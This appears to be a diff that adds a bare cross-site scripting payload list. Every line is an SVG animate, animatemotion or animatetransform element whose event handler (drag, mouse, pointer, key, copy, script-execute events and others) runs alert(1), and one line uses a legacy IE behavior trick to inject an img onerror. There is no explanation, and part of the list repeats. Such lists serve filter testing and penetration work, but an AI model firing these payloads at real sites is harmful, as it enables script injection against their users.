@@ -1,0 +1,146 @@
+<animate draggable="true" ondrag="alert(1)">test</animate>
+<animate draggable="true" ondragend="alert(1)">test</animate>
+<animate draggable="true" ondragenter="alert(1)">test</animate>
+<animate draggable="true" ondragleave="alert(1)">test</animate>
+<animate draggable="true" ondragstart="alert(1)">test</animate>
+<animate id=x tabindex=1 onactivate=alert(1)></animate>
+<animate id=x tabindex=1 onbeforeactivate=alert(1)></animate>
+<animate id=x tabindex=1 onbeforedeactivate=alert(1)></animate><input autofocus>
+<animate id=x tabindex=1 ondeactivate=alert(1)></animate><input id=y autofocus>
+<animate onafterscriptexecute=alert(1)><script>1</script>
+<animate onbeforescriptexecute=alert(1)><script>1</script>
+<animate onclick="alert(1)">test</animate>
+<animate oncontextmenu="alert(1)">test</animate>
+<animate oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<animate oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<animate ondblclick="alert(1)" autofocus tabindex=1>test</animate>
+<animate onkeydown="alert(1)" contenteditable>test</animate>
+<animate onkeypress="alert(1)" contenteditable>test</animate>
+<animate onkeyup="alert(1)" contenteditable>test</animate>
+<animate onmousedown="alert(1)">test</animate>
+<animate onmouseenter="alert(1)">test</animate>
+<animate onmouseleave="alert(1)">test</animate>
+<animate onmousemove="alert(1)">test</animate>
+<animate onmouseout="alert(1)">test</animate>
+<animate onmouseover="alert(1)">test</animate>
+<animate onmouseup="alert(1)">test</animate>
+<animate onmousewheel=alert(1)>requires scrolling
+<animate onpointerdown=alert(1)>XSS</animate>
+<animate onpointerenter=alert(1)>XSS</animate>
+<animate onpointerleave=alert(1)>XSS</animate>
+<animate onpointermove=alert(1)>XSS</animate>
+<animate onpointerout=alert(1)>XSS</animate>
+<animate onpointerover=alert(1)>XSS</animate>
+<animate onpointerrawupdate=alert(1)>XSS</animate>
+<animate onpointerup=alert(1)>XSS</animate>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
+<animatemotion draggable="true" ondrag="alert(1)">test</animatemotion>
+<animatemotion draggable="true" ondragend="alert(1)">test</animatemotion>
+<animatemotion draggable="true" ondragenter="alert(1)">test</animatemotion>
+<animatemotion draggable="true" ondragleave="alert(1)">test</animatemotion>
+<animatemotion draggable="true" ondragstart="alert(1)">test</animatemotion>
+<animatemotion id=x tabindex=1 onactivate=alert(1)></animatemotion>
+<animatemotion id=x tabindex=1 onbeforeactivate=alert(1)></animatemotion>
+<animatemotion id=x tabindex=1 onbeforedeactivate=alert(1)></animatemotion><input autofocus>
+<animatemotion id=x tabindex=1 ondeactivate=alert(1)></animatemotion><input id=y autofocus>
+<animatemotion onafterscriptexecute=alert(1)><script>1</script>
+<animatemotion onbeforescriptexecute=alert(1)><script>1</script>
+<animatemotion onclick="alert(1)">test</animatemotion>
+<animatemotion oncontextmenu="alert(1)">test</animatemotion>
+<animatemotion oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<animatemotion oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<animatemotion ondblclick="alert(1)" autofocus tabindex=1>test</animatemotion>
+<animatemotion onkeydown="alert(1)" contenteditable>test</animatemotion>
+<animatemotion onkeypress="alert(1)" contenteditable>test</animatemotion>
+<animatemotion onkeyup="alert(1)" contenteditable>test</animatemotion>
+<animatemotion onmousedown="alert(1)">test</animatemotion>
+<animatemotion onmouseenter="alert(1)">test</animatemotion>
+<animatemotion onmouseleave="alert(1)">test</animatemotion>
+<animatemotion onmousemove="alert(1)">test</animatemotion>
+<animatemotion onmouseout="alert(1)">test</animatemotion>
+<animatemotion onmouseover="alert(1)">test</animatemotion>
+<animatemotion onmouseup="alert(1)">test</animatemotion>
+<animatemotion onmousewheel=alert(1)>requires scrolling
+<animatemotion onpointermove=alert(1)>XSS</animatemotion>
+<animatemotion onpointerout=alert(1)>XSS</animatemotion>
+<animatemotion onpointerover=alert(1)>XSS</animatemotion>
+<animatemotion onpointerrawupdate=alert(1)>XSS</animatemotion>
+<animatemotion onpointerup=alert(1)>XSS</animatemotion>
+<animatetransform draggable="true" ondrag="alert(1)">test</animatetransform>
+<animatetransform draggable="true" ondragend="alert(1)">test</animatetransform>
+<animatetransform draggable="true" ondragenter="alert(1)">test</animatetransform>
+<animatetransform draggable="true" ondragleave="alert(1)">test</animatetransform>
+<animatetransform draggable="true" ondragstart="alert(1)">test</animatetransform>
+<animatetransform id=x tabindex=1 onactivate=alert(1)></animatetransform>
+<animatetransform id=x tabindex=1 onbeforeactivate=alert(1)></animatetransform>
+<animatetransform id=x tabindex=1 onbeforedeactivate=alert(1)></animatetransform><input autofocus>
+<animatetransform id=x tabindex=1 ondeactivate=alert(1)></animatetransform><input id=y autofocus>
+<animatetransform onafterscriptexecute=alert(1)><script>1</script>
+<animatetransform onbeforescriptexecute=alert(1)><script>1</script>
+<animatetransform onclick="alert(1)">test</animatetransform>
+<animatetransform oncontextmenu="alert(1)">test</animatetransform>
+<animatetransform oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<animatetransform oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<animatetransform ondblclick="alert(1)" autofocus tabindex=1>test</animatetransform>
+<animatetransform onkeydown="alert(1)" contenteditable>test</animatetransform>
+<animatetransform onkeypress="alert(1)" contenteditable>test</animatetransform>
+<animatetransform onkeyup="alert(1)" contenteditable>test</animatetransform>
+<animatetransform onmousedown="alert(1)">test</animatetransform>
+<animatetransform onmouseenter="alert(1)">test</animatetransform>
+<animatetransform onmouseleave="alert(1)">test</animatetransform>
+<animatetransform onmousemove="alert(1)">test</animatetransform>
+<animatetransform onmouseout="alert(1)">test</animatetransform>
+<animatetransform onmouseover="alert(1)">test</animatetransform>
+<animatetransform onmouseup="alert(1)">test</animatetransform>
+<animatetransform onmousewheel=alert(1)>requires scrolling
+<animatetransform onpointerdown=alert(1)>XSS</animatetransform>
+<animatetransform onpointerenter=alert(1)>XSS</animatetransform>
+<animatetransform onpointerleave=alert(1)>XSS</animatetransform>
+<animatetransform onpointermove=alert(1)>XSS</animatetransform>
+<animatetransform onpointerout=alert(1)>XSS</animatetransform>
+<animatetransform onpointerover=alert(1)>XSS</animatetransform>
+<animatetransform onpointerrawupdate=alert(1)>XSS</animatetransform>
+<animatetransform onpointerup=alert(1)>XSS</animatetransform><animatemotion onpointerdown=alert(1)>XSS</animatemotion>
+<animatemotion onpointerenter=alert(1)>XSS</animatemotion>
+<animatemotion onpointerleave=alert(1)>XSS</animatemotion>
+<animatemotion onpointermove=alert(1)>XSS</animatemotion>
+<animatemotion onpointerout=alert(1)>XSS</animatemotion>
+<animatemotion onpointerover=alert(1)>XSS</animatemotion>
+<animatemotion onpointerrawupdate=alert(1)>XSS</animatemotion>
+<animatemotion onpointerup=alert(1)>XSS</animatemotion>
+<animatetransform draggable="true" ondrag="alert(1)">test</animatetransform>
+<animatetransform draggable="true" ondragend="alert(1)">test</animatetransform>
+<animatetransform draggable="true" ondragenter="alert(1)">test</animatetransform>
+<animatetransform draggable="true" ondragleave="alert(1)">test</animatetransform>
+<animatetransform draggable="true" ondragstart="alert(1)">test</animatetransform>
+<animatetransform id=x tabindex=1 onactivate=alert(1)></animatetransform>
+<animatetransform id=x tabindex=1 onbeforeactivate=alert(1)></animatetransform>
+<animatetransform id=x tabindex=1 onbeforedeactivate=alert(1)></animatetransform><input autofocus>
+<animatetransform id=x tabindex=1 ondeactivate=alert(1)></animatetransform><input id=y autofocus>
+<animatetransform onafterscriptexecute=alert(1)><script>1</script>
+<animatetransform onbeforescriptexecute=alert(1)><script>1</script>
+<animatetransform onclick="alert(1)">test</animatetransform>
+<animatetransform oncontextmenu="alert(1)">test</animatetransform>
+<animatetransform oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<animatetransform oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<animatetransform ondblclick="alert(1)" autofocus tabindex=1>test</animatetransform>
+<animatetransform onkeydown="alert(1)" contenteditable>test</animatetransform>
+<animatetransform onkeypress="alert(1)" contenteditable>test</animatetransform>
+<animatetransform onkeyup="alert(1)" contenteditable>test</animatetransform>
+<animatetransform onmousedown="alert(1)">test</animatetransform>
+<animatetransform onmouseenter="alert(1)">test</animatetransform>
+<animatetransform onmouseleave="alert(1)">test</animatetransform>
+<animatetransform onmousemove="alert(1)">test</animatetransform>
+<animatetransform onmouseout="alert(1)">test</animatetransform>
+<animatetransform onmouseover="alert(1)">test</animatetransform>
+<animatetransform onmouseup="alert(1)">test</animatetransform>
+<animatetransform onmousewheel=alert(1)>requires scrolling
+<animatetransform onpointerdown=alert(1)>XSS</animatetransform>
+<animatetransform onpointerenter=alert(1)>XSS</animatetransform>
+<animatetransform onpointerleave=alert(1)>XSS</animatetransform>
+<animatetransform onpointermove=alert(1)>XSS</animatetransform>
+<animatetransform onpointerout=alert(1)>XSS</animatetransform>
+<animatetransform onpointerover=alert(1)>XSS</animatetransform>
+<animatetransform onpointerrawupdate=alert(1)>XSS</animatetransform>
+<animatetransform onpointerup=alert(1)>XSS</animatetransform>
+
